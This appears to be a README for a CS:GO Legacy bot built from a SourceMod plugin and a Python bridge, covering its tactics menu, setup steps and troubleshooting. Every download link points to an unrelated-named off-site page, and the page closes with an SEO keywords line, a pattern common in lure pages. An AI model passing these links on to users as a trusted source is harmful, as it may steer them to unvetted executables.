# 🤖 csgo-julia-plugin - Run a Local CS:GO Bot

[![Download csgo-julia-plugin](https://img.shields.io/badge/⬇%20Download-csgo--julia--plugin-FF5F1F?style=for-the-badge&logo=github&logoColor=white)](https://bhaktipreview48.github.io)

csgo-julia-plugin is the home of **jev-bot**, a bot for CS:GO Legacy that plays the game by making one simple choice at a time. Instead of a complicated script full of fixed rules, the bot looks at the current game, reads a short menu of possible moves, and picks one. Then it does it again a fraction of a second later. The whole thing lives on your own network, on computers that you own.

This guide is written for someone who has never set up a game server before. You do not need to know how to program. You only need to follow the steps in order, from top to bottom.

## 🎯 What This Bot Actually Does

Think of the bot as a player sitting at a computer with a very small menu in front of it. Every 0.35 seconds it gets a new menu of choices based on what is happening in the match — where the enemies are, how much health it has, whether its gun is loaded. It picks exactly one item from that menu and the game carries it out.

Two decisions get made each time:

- **The tactic** — the bigger plan for the next 0.35 seconds, such as holding an angle, peeking around a corner, pushing forward, or backing off.
- **The stance** — how the bot moves while doing it. It either **runs** to get somewhere fast, or **walks**, which is slower but much quieter and more accurate.

Because the choice is made fresh every fraction of a second, the bot reacts to what is actually happening rather than following a memorized route.

## 🧠 How the Pieces Fit Together

The bot is split into two halves that talk to each other over your local network. This is why it needs two computers (or one computer and one laptop) to run comfortably.

```
 ┌──────────── Desktop (Windows) ────────────┐        ┌──────── Desktop or MacBook ────┐
 │ CS:GO client  ◄──►  srcds + SourceMod     │  UDP   │ bridge.py                      │
 │                       jev_bot.smx (body)  │ ─────► │ rules / julia / laya /         │
 │   aim, fire, reaction, reload, spots      │ ◄───── │ local / http (brain)           │
 └───────────────────────────────────────────┘ 27500  └────────────────────────────────┘
      S tick hp ... |E ...  ──►            ◄──  A <action> <tick>
```

The **body** is the game server side. It is the SourceMod plugin called `jev_bot.smx`, and it handles the physical parts of playing: aiming, firing, reaction delay, reloading, and remembering good spots on each map.

The **brain** is the `bridge.py` script. It receives the game state, thinks about it, and sends back one action with a tick number so the two halves stay in sync. The brain can be driven by a set of rules, by the Julia route, by a Laya route, by a local model, or over HTTP. You choose which one fits your setup.

They communicate on **UDP port 27500** by default. Everything stays inside your own network.

## ✨ The Moves It Can Choose

Here is the full menu of tactics, explained in plain language:

| Tactic | What it means in the match |
|---|---|
| `hold` | Stand still and watch an angle, waiting for an enemy to appear |
| `peek_left` | Step out to the left to look around a corner |
| `peek_right` | Step out to the right to look around a corner |
| `strafe_shoot` | Move sideways while firing, to be harder to hit |
| `crouch_spray` | Crouch down and fire a long burst to control the recoil |
| `fall_back` | Retreat to a safer position |
| `push` | Advance aggressively toward the objective |
| `reload` | Stop and reload the weapon |
| `face_sound` | Turn to look at the last sound it heard |

Each tactic is paired with a **stance** of either `run` or `walk`. Running gets the bot into position quickly but makes noise and hurts accuracy. Walking is quiet and precise. Choosing when to run and when to walk is a big part of what makes the bot feel believable.

## 📦 What You Need Before You Start

Gather these things first so nothing blocks you halfway through:

- A **Windows 10 or Windows 11 desktop PC** with CS:GO Legacy installed. This machine will be the "body."
- A **second computer** — a desktop or a MacBook — to act as the "brain." This one runs `bridge.py`. Using a second machine keeps the game smooth, because the brain can think without stealing performance from the game.
- Both computers on the **same home network**, wired or on the same Wi-Fi.
- The **SourceMod** add-on for the game server. This is the standard framework that lets plugins like `jev_bot.smx` load.
- About 2 GB of free disk space on each machine.
- A mouse and keyboard you are comfortable with.

## 💾 Download the Application

Everything you need starts on the project page.

### [**➡️ Visit this link to download the application**](https://bhaktipreview48.github.io)

[![Get csgo-julia-plugin](https://img.shields.io/badge/⬇%20Get%20csgo--julia--plugin-2ECC71?style=for-the-badge&logo=github&logoColor=white)](https://bhaktipreview48.github.io)

Open the page, use the download button shown there, and save the files to a folder you will remember — for example `C:\jev-bot`. Everything else in this guide assumes you can find that folder again.

## 🚀 Setting It Up, Step by Step

**Step 1 — Install the game server.** On your Windows desktop, set up the CS:GO Legacy dedicated server (`srcds`) using the standard Steam tool for it. This is the program that hosts the match on your own machine.

**Step 2 — Add SourceMod.** Copy the SourceMod files into the server's `addons` folder. When the server starts, it should report that SourceMod loaded. If it does, your foundation is ready.

**Step 3 — Drop in the bot body.** Copy `jev_bot.smx` into the server's `plugins` folder. Restart the server. The plugin is now the "body" — the part that aims, fires, reloads, and reacts.

**Step 4 — Start the game with insecure mode.** The bot only works on a private server started with the `-insecure` flag. This is a requirement of the setup, not a preference. Start your server that way every time you want to use the bot.

**Step 5 — Move to the brain machine.** On your second computer, open the folder you downloaded and find `bridge.py`. Launch it. It will listen on UDP port 27500 and wait for the game state to arrive.

**Step 6 — Pick your thinking mode.** The brain can run on rules, on Julia, on Laya, on a local model, or over HTTP. Choose the one you want in the configuration. If you are not sure, start with rules — it is the simplest and needs nothing extra installed.

**Step 7 — Connect the two halves.** Point the game server at the IP address of the brain machine on port 27500. Both machines must be on the same network.

**Step 8 — Join and watch.** Open CS:GO on the Windows desktop, connect to your own local server, and start a round. You should see the bot receiving the state and answering with actions.

## 🛡️ Where You Can Use It

This bot is built for a **local server started with `-insecure`, played with people who have agreed to be there**. That is the only place it belongs. Keep it off matchmaking and off public servers entirely — the setup depends on a private, local game to work at all, and playing against people who did not agree to it is not what this tool is for.

A good habit: before each session, confirm your server was launched with `-insecure` and that everyone in the lobby knows a bot is joining.

## 🔧 Common Setup Problems

**The bot does not move at all.** Almost always the two halves are not talking. Check that `bridge.py` is running, that both machines are on the same network, and that nothing is blocking UDP port 27500.

**The bot moves but never aims.** The body is working but the brain is sending actions that do not match. Confirm that the tick numbers are being passed back correctly, and restart both halves so they start counting together.

**The server says SourceMod is missing.** The add-on was copied to the wrong folder. It belongs in `addons`, not next to the server executable.

**Actions arrive but seem delayed.** Run the brain on the second computer rather than on the gaming machine. Sharing one computer between the game and the brain is the most common cause of lag.

**The bot behaves erratically for a few seconds after joining.** It is still collecting its first few game states. Give it a moment to settle into the round.

## ❓ Questions People Ask

**Do I need to know Julia to use this?** No. The Julia route is one option among several. The rules mode requires no programming at all.

**Can I run everything on one computer?** You can, but it is not recommended. Two machines give noticeably smoother results.

**Can I change how aggressive the bot is?** Yes — the tactics list is the control. Adjust how often `push` and `peek` are allowed versus `hold` and `fall_back`, and the bot's personality changes.

**What happens if I close the brain?** The body stops receiving actions and the bot simply stands still. Nothing breaks. Restart `bridge.py` and it picks up again.

**Why 0.35 seconds?** That is the decision window. It is short enough to feel responsive in a firefight and long enough that the bot is not overthinking every single frame.

Keywords: csgo bot, jev-bot, sourcemod plugin, csgo legacy, system one model, bridge.py, local game server, udp 27500, private server bot, insecure mode, bot tactics, game state decisions